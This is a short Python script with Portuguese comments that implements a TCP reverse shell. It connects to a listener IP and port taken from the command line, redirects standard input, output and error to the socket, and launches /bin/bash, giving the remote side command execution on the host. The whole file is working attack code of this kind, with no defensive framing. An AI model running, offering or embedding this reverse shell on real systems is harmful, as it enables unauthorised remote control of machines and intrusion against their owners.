import socket
import sys
import subprocess
import os 

def shell_tcp(ip, porta):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    # Cria um socket TCP
    client.connect((ip, porta))    # Conecta ao servidor listener

    os.dup2(client.fileno(), 0) 
    os.dup2(client.fileno(), 1)    # Redireciona a entrada padrão (stdin), saída padrão (stdout) e erro padrão (stderr) para o socket
    os.dup2(client.fileno(), 2)

    subprocess.call(['/bin/bash'])    # Executa o shell bash, permitindo ao servidor executar comandos remotamente


if __name__ == "__main__":
    if len(sys.argv) == 3:
        try:
            ip = sys.argv[1]  # IP do servidor listener
            porta = int(sys.argv[2])     # Porta do servidor listener
            shell_tcp(ip, porta)
        except Exception as e:
            print(f'Erro: {e}')
    else:
        print('Modo de uso: python3 client-tcp.py <ip> <porta>')